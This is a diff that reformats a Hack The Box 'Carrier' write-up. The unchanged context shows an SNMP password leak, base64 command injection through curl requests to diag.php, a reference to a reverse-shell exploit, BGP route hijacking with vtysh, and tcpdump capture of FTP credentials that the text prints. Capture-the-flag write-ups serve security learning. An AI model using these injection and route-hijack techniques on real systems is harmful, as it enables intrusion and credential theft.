@@ -41,7 +41,7 @@ Nmap done: 1 IP address (1 host up) scanned in 47.18 seconds
 ```
 NMAP Udp port scanning:
 
-```
+```console
 $ nmap --top-ports 100 -sU 10.10.10.105 -o carrier-udp2.nmap
 
 
@@ -61,7 +61,7 @@ PORT     STATE         SERVICE
 
 ### Directories scanning:
 
-```
+```console
 [03:18:29] Starting:
 [03:18:34] 200 -  931B  - /img/
 [03:18:36] 200 -    1KB - /index.php
@@ -77,7 +77,7 @@ PORT     STATE         SERVICE
 [03:28:44] 302 -    0B  - /diag.php  ->  /index.php
 ```
 
- > After scanning Directories with dirsearch I found a pdf file which contains the explanation of the error codes which where shown on the main page of the site.
+ After scanning Directories with dirsearch I found a pdf file which contains the explanation of the error codes which where shown on the main page of the site.
 
 @ http://10.10.10.105/doc/error_codes.pdf
 45007 --> License invalid or expired
@@ -85,13 +85,15 @@ PORT     STATE         SERVICE
 
 > As udp port scan shows that the snmp port 161 is up. I used snmpwalk right away!
 
+```console
 $ snmpwalk -c public -v 2c 10.10.10.105
+```
 
 ```
 iso.3.6.1.2.1.47.1.1.1.1.11 = STRING: "SN#NET_45JDX23"
 iso.3.6.1.2.1.47.1.1.1.1.11 = No more variables left in this MIB View (It is past the end of the MIB tree)   
 ```
-> This revealed string that contains the password. First i tried the whole string as "SN#NET_45JDX23" which did not worked, after that I thought why not to try only "NET_45JDX23", Which actually worked with the user admin.
+This revealed string that contains the password. First i tried the whole string as "SN#NET_45JDX23" which did not worked, after that I thought why not to try only "NET_45JDX23", Which actually worked with the user admin.
 
 @ http://10.10.10.105/dashboard.php
 ```
@@ -108,7 +110,7 @@ Updated 2018/06/16: No prbl. found, suspect they had stuck routes after the leak
 
 #### Command Injection:
 
-```
+```console
 curl -i -s -k  -X $'POST' \
     -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0' -H $'Referer: http://10.10.10.105/diag.php' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Upgrade-Insecure-Requests: 1' \
     -b $'PHPSESSID=cXVhZ2dh' \
@@ -116,14 +118,14 @@ curl -i -s -k  -X $'POST' \
     $'http://10.10.10.105/diag.php'  
 ```
 
-> Which out the output of ps aux and also it was greping the quagga from it. so the command was like "ps aux | grep quagga". quagga was out base64 input from the post request and now we know that it is command injection.
+Which out the output of ps aux and also it was greping the quagga from it. so the command was like "ps aux | grep quagga". quagga was out base64 input from the post request and now we know that it is command injection.
 
 payload:
 `| whoami`
 
 `base64-encode= YHwgd2hvYW1pYA==`
 
-```
+```console
 curl -i -s -k  -X $'POST' \
     -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0' -H $'Referer: http://10.10.10.105/diag.php' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Upgrade-Insecure-Requests: 1' \
     -b $'PHPSESSID=civdj8h94df0kj1smcf948q7v6' \
@@ -139,7 +141,7 @@ reverse shell payload:
 
 Curl request to get reverse shell
 
-```
+```console
 curl -i -s -k  -X $'POST' \
     -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0' -H $'Referer: http://10.10.10.105/diag.php' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Upgrade-Insecure-Requests: 1' \
     -b $'PHPSESSID=0lt8vqm3in2h456miodpsk4ok4' \
@@ -148,7 +150,7 @@ curl -i -s -k  -X $'POST' \
 
 ```
 
-> After exploring a site bit I realised, Its getting very hard to reproduce every step again and again to get reverse shell, So I code a reverse shell exploit.
+After exploring a site bit I realised, Its getting very hard to reproduce every step again and again to get reverse shell, So I code a reverse shell exploit.
 
 
 ### Reverse shell exploit:
@@ -205,7 +207,7 @@ with requests.Session() as box:
 
 #### Spawing shell:
 
-```
+```console
 $ /bin/bash -i
 ```    
 
@@ -225,7 +227,7 @@ This is possible because we are on the host that is responsible for routing.
 
 Quagga stores its configuration files in /etc/quagga/ directory
 
-```
+```console
 root@r1:/etc/quagga# cat bgpd.conf
 
 !
@@ -251,7 +253,7 @@ line vty
 
 @ command line utility: vtysh
 
-```
+```console
 r1# write terminal
 
 Building configuration...
@@ -296,7 +298,7 @@ end
 ```
 Checking the bgp summary:
 
-```
+```console
 r1# show ip bgp summary
 
 BGP router identifier 10.255.255.1, local AS number 100
@@ -310,7 +312,7 @@ Neighbor        V         AS MsgRcvd MsgSent   TblVer  InQ OutQ Up/Down  State/P
 Total number of neighbors 2
 ```
 
-```
+```console
 r1# show ip bgp
 show ip bgp
 BGP table version is 0, local router ID is 10.255.255.1
@@ -326,7 +328,7 @@ Origin codes: i - IGP, e - EGP, ? - incomplete
 
 Commands that helped me to route the servers:
 
-```
+```console
 > configure terminal
 
 > access-list 50 permit 10.120.15.0 0.0.0.128   --> This is ftp server
@@ -383,7 +385,9 @@ Explanation: Route map entries are read in order. You can identify the order usi
 
 Now, All I have to do is to capture the packets.
 
+```console
 $ root@carrier:~# tcpdump -i any -w root1.pcap -s 0 net 10.120.15.0/24
+```
 
 After going through the output of capture packets I found these credentials in it.
 
@@ -393,7 +397,7 @@ ftp password:BGPtelc0rout1ng
 
 Finally, logged in to the ssh using these keys!
 
-```
+```console
 $ ssh root@10.10.10.105
 $ root@carrier:~# cat /root/root.txt | wc -c
  33
